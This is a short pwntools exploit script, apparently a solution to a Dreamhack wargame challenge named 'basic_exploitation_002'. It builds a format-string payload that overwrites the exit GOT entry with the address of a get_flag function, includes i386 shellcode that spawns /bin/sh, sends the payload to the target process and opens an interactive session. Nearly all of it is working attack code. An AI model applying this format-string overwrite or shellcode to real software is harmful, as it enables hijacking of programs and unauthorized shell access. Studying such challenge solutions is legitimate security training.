from pwn import *

context.arch='i386'
#context.log_level="debug"

#conn = remote("host1.dreamhack.games", 13731)
conn = process("basic_exploitation_002")


#shellcode = asm(shellcraft.linux.sh())
#shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80"
shellcode = b"\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xb0\x08\x40\x40\x40\xcd\x80"

exit_got = 0x0804a024
get_flag = 0x08048609

# "\x26\xa0\x04\x08"+"\x24\xa0\x04\x08"+"%2044x"+"%1$hn"+"%32261x"+"%2$hn"

payload  = b""
payload += p32(exit_got)
payload += p32(exit_got+2)
payload += b"%2044x"
payload += b"%2$hn"
payload += b"%32261x"
payload += b"%1$hn"

conn.send(payload)

with open("payload", "wb") as fd:
    fd.write(payload)


conn.interactive()
